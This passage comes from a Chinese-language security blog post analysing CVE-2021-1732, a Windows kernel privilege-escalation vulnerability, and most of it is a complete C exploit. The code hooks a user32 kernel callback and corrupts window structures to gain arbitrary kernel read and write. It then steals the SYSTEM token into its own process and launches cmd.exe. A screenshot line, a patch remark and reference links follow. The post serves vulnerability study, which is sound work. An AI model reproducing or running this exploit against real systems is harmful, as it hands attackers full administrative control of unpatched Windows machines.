class="line">	<span class="comment">// 0x3d8位置为函数 user32!_xxxClientAllocWindowClassExtraBytes:</span></span><br><span class="line">	OldxxxClientAllocWindowClassExtraBytes = (fnxxxClientAllocWindowClassExtraBytes) * (DWORD64*)(KernelCallbackTable + <span class="number">0x3D8</span>);<span class="comment">// 0x3d8位置为函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	VirtualProtect((LPVOID)(KernelCallbackTable + <span class="number">0x3D8</span>), <span class="number">0x300</span>ui64, <span class="number">0x40</span>u, &amp;dwOldProtect);</span><br><span class="line">	*(DWORD64*)(KernelCallbackTable + <span class="number">0x3D8</span>) = (DWORD64)MyxxxClientAllocWindowClassExtraBytes;</span><br><span class="line">	VirtualProtect((LPVOID)(KernelCallbackTable + <span class="number">0x3D8</span>), <span class="number">0x300</span>ui64, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD64 <span class="title">MyRead</span><span class="params">(DWORD64 targetAdress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	BYTE qwRet[<span class="number">8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	MENUBARINFO pmbi = &#123;&#125;;</span><br><span class="line">	pmbi.cbSize = <span class="keyword">sizeof</span>(MENUBARINFO);</span><br><span class="line"></span><br><span class="line">	*(PDWORD64)(*(PDWORD64)(g_qwMenu + <span class="number">0x58</span>)) = targetAdress - <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//printf(&quot;%lx \n&quot;, *(PDWORD64)(*(PDWORD64)(g_qwMenu + 0x58)));</span></span><br><span class="line">	<span class="keyword">if</span> (!GetMenuBarInfo(g_hwnd_max, <span class="number">-3</span>, <span class="number">1</span>, &amp;pmbi))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetMenuBarInfo error&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	*(PDWORD)(qwRet) = pmbi.rcBar.left;        <span class="comment">// 减去 Rect.left，创建窗口时，该值被指定为 0</span></span><br><span class="line">	*(PDWORD)(qwRet + <span class="number">4</span>) = pmbi.rcBar.top;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> *(PDWORD64)qwRet;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT __fastcall <span class="title">MyWndProc</span><span class="params">(HWND a1, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (a2 != <span class="number">2</span>)</span><br><span class="line">		<span class="keyword">return</span> DefWindowProcW(a1, a2, a3, a4);</span><br><span class="line">	PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InitWindowsClass</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> WndNum = <span class="number">10</span>;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">MEMORY_BASIC_INFORMATION</span> <span class="title">Buffer</span> =</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">	srand(time(<span class="number">0</span>i64));</span><br><span class="line">	g_nRandom = (rand() % <span class="number">255</span> + <span class="number">0x1234</span>) | <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	WNDCLASSEXW wndClass = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">	wndClass.lpfnWndProc = (WNDPROC)MyWndProc;</span><br><span class="line">	wndClass.cbSize = <span class="number">80</span>;</span><br><span class="line">	wndClass.style = <span class="number">3</span>;</span><br><span class="line">	wndClass.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">	wndClass.cbWndExtra = <span class="number">32</span>;</span><br><span class="line">	wndClass.hInstance = GetModuleHandleW(<span class="number">0</span>i64);</span><br><span class="line">	wndClass.lpszClassName = <span class="string">L&quot;normalClass&quot;</span>;</span><br><span class="line">	ATOM g_lpWcxNormal = RegisterClassExW(&amp;wndClass);</span><br><span class="line">	<span class="comment">//g_nRandom</span></span><br><span class="line">	wndClass.cbWndExtra = g_nRandom;</span><br><span class="line">	wndClass.lpszClassName = <span class="string">L&quot;magicClass&quot;</span>;</span><br><span class="line">	ATOM g_lpWcxMagic = RegisterClassExW(&amp;wndClass);</span><br><span class="line"></span><br><span class="line">	CreatePopupMenu();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; WndNum; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		g_hwnd[i]= CreateWindowExW(</span><br><span class="line">						WS_EX_NOACTIVATE,</span><br><span class="line">						(LPCWSTR)(<span class="keyword">unsigned</span> __int16)g_lpWcxNormal,</span><br><span class="line">						<span class="string">L&quot;windows&quot;</span>,</span><br><span class="line">						<span class="number">0x8000000</span>u,</span><br><span class="line">						<span class="number">0</span>,</span><br><span class="line">						<span class="number">0</span>,</span><br><span class="line">						<span class="number">0</span>,</span><br><span class="line">						<span class="number">0</span>,</span><br><span class="line">						<span class="number">0</span>i64,</span><br><span class="line">						CreateMenu(),</span><br><span class="line">						GetModuleHandleW(<span class="number">0</span>i64),</span><br><span class="line">						<span class="number">0</span>i64);</span><br><span class="line">		g_ptagWNDk[i] = (DWORD64)pHmValidateHandle(g_hwnd[i], <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">		VirtualQuery((LPVOID)g_ptagWNDk[i], &amp;Buffer, <span class="number">0x30</span>ui64);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		typedef struct _MEMORY_BASIC_INFORMATION &#123;</span></span><br><span class="line"><span class="comment">			PVOID BaseAddress;</span></span><br><span class="line"><span class="comment">			PVOID AllocationBase;</span></span><br><span class="line"><span class="comment">			DWORD AllocationProtect;</span></span><br><span class="line"><span class="comment">			SIZE_T RegionSize;</span></span><br><span class="line"><span class="comment">			DWORD State;</span></span><br><span class="line"><span class="comment">			DWORD Protect;</span></span><br><span class="line"><span class="comment">			DWORD Type;</span></span><br><span class="line"><span class="comment">		&#125; MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="keyword">if</span> (g_qwMinBaseAddress == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			g_qwMinBaseAddress = (DWORD64)Buffer.BaseAddress;</span><br><span class="line">			g_qwRegionSize = (DWORD64)Buffer.RegionSize;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (g_qwMinBaseAddress &gt; (DWORD64)Buffer.BaseAddress)</span><br><span class="line">			&#123;</span><br><span class="line">				g_qwMinBaseAddress = (DWORD64)Buffer.BaseAddress;</span><br><span class="line">				g_qwRegionSize = (DWORD64)Buffer.RegionSize;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (*(DWORD*)((<span class="keyword">char</span>*)g_ptagWNDk[<span class="number">0</span>] + <span class="number">8</span>) &lt; *(DWORD*)((<span class="keyword">char</span>*)g_ptagWNDk[<span class="number">1</span>] + <span class="number">8</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		g_ptagWNDK_min = g_ptagWNDk[<span class="number">0</span>];</span><br><span class="line">		g_ptagWNDK_max = g_ptagWNDk[<span class="number">1</span>];</span><br><span class="line">		g_hwnd_min = g_hwnd[<span class="number">0</span>];</span><br><span class="line">		g_hwnd_max = g_hwnd[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		g_ptagWNDK_min = g_ptagWNDk[<span class="number">1</span>];</span><br><span class="line">		g_ptagWNDK_max = g_ptagWNDk[<span class="number">0</span>];</span><br><span class="line">		g_hwnd_min = g_hwnd[<span class="number">1</span>];</span><br><span class="line">		g_hwnd_max = g_hwnd[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	OffsetToDesktopHeap_min = *(DWORD*)(g_ptagWNDK_min + <span class="number">8</span>);</span><br><span class="line">	OffsetToDesktopHeap_max= *(DWORD*)(g_ptagWNDK_max + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//改变窗口0的寻址方式，变为桌面堆寻址</span></span><br><span class="line">	g_pfnNtUserConsoleControl(<span class="number">6</span>i64, &amp;g_hwnd_min, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	OldpExtraBytes_min = *(DWORD64*)(g_ptagWNDK_min + dwpExtraBytesOffset);</span><br><span class="line">	OldpExtraBytes_max = *(DWORD64*)(g_ptagWNDK_max + dwpExtraBytesOffset);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>i64; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">		DestroyWindow(g_hwnd[i]);</span><br><span class="line"></span><br><span class="line">	g_hwndMagic = CreateWindowExW(</span><br><span class="line">		<span class="number">0x8000000</span>u,</span><br><span class="line">		(LPCWSTR)(<span class="keyword">unsigned</span> __int16)g_lpWcxMagic,</span><br><span class="line">		<span class="string">L&quot;Magicwnd&quot;</span>,</span><br><span class="line">		<span class="number">0x8000000</span>u,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="number">0</span>i64,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		GetModuleHandleW(<span class="number">0</span>i64),</span><br><span class="line">		<span class="number">0</span>i64);</span><br><span class="line"></span><br><span class="line">	SetWindowLongW(g_hwndMagic, dwpExtraBytesOffset, OffsetToDesktopHeap_min);</span><br><span class="line">	SetWindowLongW(g_hwndMagic, dwcbWndExtraOffset, <span class="number">0xFFFFFFF</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;testnum address : %p\n&quot;</span>, &amp;testnum);</span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_max + dwpExtraBytesOffset - OffsetToDesktopHeap_min, (LONG_PTR)&amp;testnum);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;testnum old value : %x\n&quot;</span>, testnum);</span><br><span class="line">	SetWindowLongPtrA(g_hwnd_max, <span class="number">0</span>, <span class="number">0x1234</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;testnum new value : %x\n&quot;</span>, testnum);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	HANDLE hProcHeap = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	hProcHeap = GetProcessHeap();</span><br><span class="line">	g_qwMenu = (DWORD64)HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, <span class="number">0xA0</span>);</span><br><span class="line"></span><br><span class="line">	*(PDWORD64)(g_qwMenu + <span class="number">0x98</span>) = (DWORD64)HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	*(PDWORD64)(*(PDWORD64)(g_qwMenu + <span class="number">0x98</span>)) = g_qwMenu;</span><br><span class="line"></span><br><span class="line">	*(PDWORD64)(g_qwMenu + <span class="number">0x28</span>) = (DWORD64)HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, <span class="number">0x200</span>);</span><br><span class="line">	*(PDWORD64)(*(PDWORD64)(g_qwMenu + <span class="number">0x28</span>) + <span class="number">0x2C</span>) = <span class="number">1</span>;</span><br><span class="line">	*(PDWORD64)(g_qwMenu + <span class="number">0x58</span>) = (DWORD64)HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, <span class="number">0x8</span>);</span><br><span class="line">	*(PDWORD)(g_qwMenu + <span class="number">0x40</span>) = <span class="number">1</span>;</span><br><span class="line">	*(PDWORD)(g_qwMenu + <span class="number">0x44</span>) = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	DWORD64 qwStyle = *(PDWORD64)(g_ptagWNDK_max + dwStyleOffset);</span><br><span class="line">	qwStyle |= <span class="number">0x4000000000000000</span>;</span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_max + dwStyleOffset - OffsetToDesktopHeap_min, qwStyle);</span><br><span class="line"></span><br><span class="line">	qwspMenuOld =SetWindowLongPtrA(g_hwnd_max, GWLP_ID, g_qwMenu);</span><br><span class="line"></span><br><span class="line">	qwStyle &amp;= ~<span class="number">0x4000000000000000</span>;</span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_max + dwStyleOffset - OffsetToDesktopHeap_min, qwStyle);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//printf(&quot;%lx %lx \n&quot;, OffsetToDesktopHeap_min, OffsetToDesktopHeap_max);</span></span><br><span class="line">	<span class="comment">//SetWindowLongW(g_hwndMagic, 0x128, OffsetToDesktopHeap_max);</span></span><br><span class="line">	<span class="comment">//printf(&quot;testnum address : %p\n&quot;, &amp;testnum);</span></span><br><span class="line">	<span class="comment">//getchar();</span></span><br><span class="line">	<span class="comment">//SetWindowLongPtrA(g_hwnd_min, 0x128, (LONG_PTR)&amp;testnum);</span></span><br><span class="line">	<span class="comment">//printf(&quot;testnum old value : %x\n&quot;, testnum);</span></span><br><span class="line">	<span class="comment">//SetWindowLongW(g_hwnd_max, 0, 0x1234);</span></span><br><span class="line">	<span class="comment">//printf(&quot;testnum new value : %x&quot;, testnum);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//DWORD64 value= MyRead((DWORD64)&amp;testnum);</span></span><br><span class="line">	<span class="comment">//printf(&quot;value=: %lx &quot;, value);</span></span><br><span class="line">	<span class="comment">//getchar();</span></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ULONG64 <span class="title">GetNTBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG64 Base[<span class="number">0x1000</span>];</span><br><span class="line">	DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">	ULONG64 ulKrnlBase = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (EnumDeviceDrivers((LPVOID*)&amp;Base, <span class="keyword">sizeof</span>(Base), &amp;dwRet))</span><br><span class="line">	&#123;</span><br><span class="line">		ulKrnlBase = Base[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ulKrnlBase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ULONG64 <span class="title">GetSystemProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HMODULE hModel = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG64 ulAddress = <span class="number">0</span>, ulOSBase = <span class="number">0</span>, ulRes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	ulOSBase = GetNTBase();</span><br><span class="line"></span><br><span class="line">	hModel = LoadLibraryA(<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">	ulAddress = (ULONG64)GetProcAddress(hModel, <span class="string">&quot;PsInitialSystemProcess&quot;</span>);</span><br><span class="line"></span><br><span class="line">	ulRes = ulAddress - (ULONG64)hModel + ulOSBase;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ulRes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrivilegeEscalatio</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD64 qwSytemAddr = GetSystemProcess();</span><br><span class="line">	DWORD dwPid = GetCurrentProcessId();</span><br><span class="line">	DWORD dwtmpPid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	DWORD64 qwEprocess = MyRead(qwSytemAddr);</span><br><span class="line">	DWORD64 qwSystemToken = MyRead(qwEprocess + dwTokenOffset);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		qwEprocess = MyRead(qwEprocess + dwLinkOffset) - dwLinkOffset;</span><br><span class="line">		dwtmpPid = MyRead(qwEprocess + dwPIDOffset);</span><br><span class="line">	&#125; <span class="keyword">while</span> (dwPid != dwtmpPid);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_max + dwpExtraBytesOffset - OffsetToDesktopHeap_min, qwEprocess + dwTokenOffset);</span><br><span class="line">	SetWindowLongPtrA(g_hwnd_max, <span class="number">0</span>, qwSystemToken);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Init_CVE_2021_1732</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL bRet = TRUE;</span><br><span class="line">    <span class="keyword">if</span> (!FindHMValidateHandle()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Failed to locate HmValidateHandle, exiting\n&quot;</span>);</span><br><span class="line">		bRet = FALSE;</span><br><span class="line">		<span class="keyword">return</span> bRet;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!HookClientAllocWindowClassExtraBytes())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Failed to locate HmValidateHandle, exiting\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	InitWindowsClass();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">CreateCmd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="keyword">sizeof</span>(si) &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">	si.wShowWindow = SW_SHOW;</span><br><span class="line">	WCHAR wzFilePath[MAX_PATH] = &#123; <span class="string">L&quot;cmd.exe&quot;</span> &#125;;</span><br><span class="line">	BOOL bReturn = CreateProcessW(<span class="literal">NULL</span>, wzFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOW)&amp;si, &amp;pi);</span><br><span class="line">	<span class="keyword">if</span> (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">FixDate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	g_ptagWNDK_Magic= (DWORD64)pHmValidateHandle(g_hwndMagic, <span class="number">1</span>);</span><br><span class="line">	OffsetToDesktopHeap_Magic= *(PDWORD)(g_ptagWNDK_Magic + <span class="number">8</span>);</span><br><span class="line">	DWORD dwFlags = *(PDWORD)(g_ptagWNDK_Magic + dwExtraFlagOffset);</span><br><span class="line">	dwFlags &amp;= ~<span class="number">0x800</span>;</span><br><span class="line">	DWORD64 qwBuffer = (DWORD64)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_nRandom);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//tagWNDk2</span></span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_Magic + dwExtraFlagOffset - OffsetToDesktopHeap_min, dwFlags);</span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_Magic + dwpExtraBytesOffset - OffsetToDesktopHeap_min, qwBuffer);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//tagWNDk1</span></span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_max + dwpExtraBytesOffset - OffsetToDesktopHeap_min, OldpExtraBytes_max);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//tagWNDk0</span></span><br><span class="line">	<span class="comment">//SetWindowLongPtrA(g_hwnd_min, dwcbWndExtraOffset, 0x140);</span></span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, dwpExtraBytesOffset, OldpExtraBytes_min);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	DWORD64 qwStyle = *(PDWORD64)(g_ptagWNDK_max + dwStyleOffset);</span><br><span class="line">	qwStyle |= <span class="number">0x4000000000000000</span>;</span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_max + dwStyleOffset - OffsetToDesktopHeap_min, qwStyle);</span><br><span class="line"></span><br><span class="line">	SetWindowLongPtrA(g_hwnd_max, GWLP_ID, qwspMenuOld);</span><br><span class="line"></span><br><span class="line">	qwStyle &amp;= ~<span class="number">0x4000000000000000</span>;</span><br><span class="line">	SetWindowLongPtrA(g_hwnd_min, OffsetToDesktopHeap_max + dwStyleOffset - OffsetToDesktopHeap_min, qwStyle);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 程序入口点 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Init_CVE_2021_1732();</span><br><span class="line"></span><br><span class="line">	PrivilegeEscalatio();</span><br><span class="line"></span><br><span class="line">	CreateCmd();</span><br><span class="line"></span><br><span class="line">	FixDate();</span><br><span class="line"></span><br><span class="line">	getchar();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>效果如下<br><img src="https://s2.loli.net/2023/04/10/gByWaNks7pJLYi5.png" alt="21.png"></p>
<h2 id="微软补丁"><a href="#微软补丁" class="headerlink" title="微软补丁"></a>微软补丁</h2><p>下载不到补丁，链接失效了，只不过无所谓，后面出现了一个绕过这个补丁的提权洞CVE-2022-21882，到时候对比也行。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241804#h3-8">CVE-2021-1732 Windows10 本地提权漏洞复现及详细分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/KaLendsi/CVE-2021-1732-Exploit">Github: KaLendsi/CVE-2021-1732-Exploit</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274015.htm">CVE-2021-1732提权漏洞学习笔记-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">The_Itach1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/04/10/CVE-2021-1732%20Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://example.com/2023/04/10/CVE-2021-1732%20Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Windows/">Windows</a><a class="post-meta__tags" href="/tags/cve/">cve</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/04/26/CVE-2023-21768%20Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">CVE-2023-21768 Windows内核提权漏洞</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/20/CVE-2014-4113%20window%E5%86%85%E6%A0%B8%E6%8F%90%E5%8F%96%E6%BC%8F%E6%B4%9E/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">CVE-2014-4113 window内核提取漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/03/20/CVE-2014-4113 window内核提取漏洞/" title="CVE-2014-4113 window内核提取漏洞"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-20</div><div class="title">CVE-2014-4113 window内核提取漏洞</div></div></a></div><div><a href="/2023/04/26/CVE-2023-21768 Windows内核提权漏洞分析/" title="CVE-2023-21768 Windows内核提权漏洞"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-26</div><div class="title">CVE-2023-21768 Windows内核提权漏洞</div></div></a></div><div><a href="/2021/10/19/Hook API/" title="Hook API"><img class="cover" src="https://i.loli.net/2021/10/19/zVLWyCboJvDKMQZ.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-19</div><div class="title">Hook API</div></div></a></div><div><a href="/2021/03/09/DLL注入技术/" title="DLL注入技术"><img class="cover" src="https://i.loli.net/2021/03/09/ureiVDLYMQqvnIf.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-09</div><div class="title">DLL注入技术</div></div></a></div><div><a href="/2022/01/11/windows反调试总结/" title="Windows反调试总结"><img class="cover" src="https://s2.loli.net/2022/01/11/RcyES7Ve6Fmk9Dw.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-11</div><div class="title">Windows反调试总结</div></div></a></div><div><a href="/2021/03/30/win32编程学习笔记/" title="win32编程学习笔记"><img class="cover" src="https://i.loli.net/2021/03/30/n7siDC4uFlg8SLv.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-30</div><div class="title">win32编程学习笔记</div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/5.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">The_Itach1</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">68</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">27</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2021-1732-window%E5%86%85%E6%A0%B8%E6%8F%90%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">CVE-2021-1732 window内核提取漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item 